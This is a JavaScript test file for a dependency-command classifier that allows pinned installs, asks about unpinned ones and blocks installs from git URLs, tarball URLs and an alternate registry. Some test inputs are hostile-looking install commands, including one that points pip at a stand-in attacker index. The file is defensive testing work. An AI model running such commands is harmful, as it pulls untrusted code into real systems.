import test from 'node:test'
import assert from 'node:assert/strict'
import { classifyDependencyCommand } from '../src/index.js'

test('allows unrelated commands', () => assert.equal(classifyDependencyCommand('git status').decision, 'ALLOW'))
test('asks for a new unpinned dependency', () => assert.equal(classifyDependencyCommand('npm install lodash').decision, 'ASK'))
test('allows an explicit versioned dependency', () => assert.equal(classifyDependencyCommand('npm install lodash@4.17.21').decision, 'ALLOW'))
test('blocks git and URL sources', () => {
  assert.equal(classifyDependencyCommand('pip install git+https://github.com/acme/pkg.git').decision, 'BLOCK')
  assert.equal(classifyDependencyCommand('npm install https://example.com/pkg.tgz').decision, 'BLOCK')
})
test('blocks alternate registries', () => assert.equal(classifyDependencyCommand('pip install foo --index-url https://evil.example/simple').decision, 'BLOCK'))
test('asks for implicit install with no explicit package', () => assert.equal(classifyDependencyCommand('pnpm install').decision, 'ASK'))
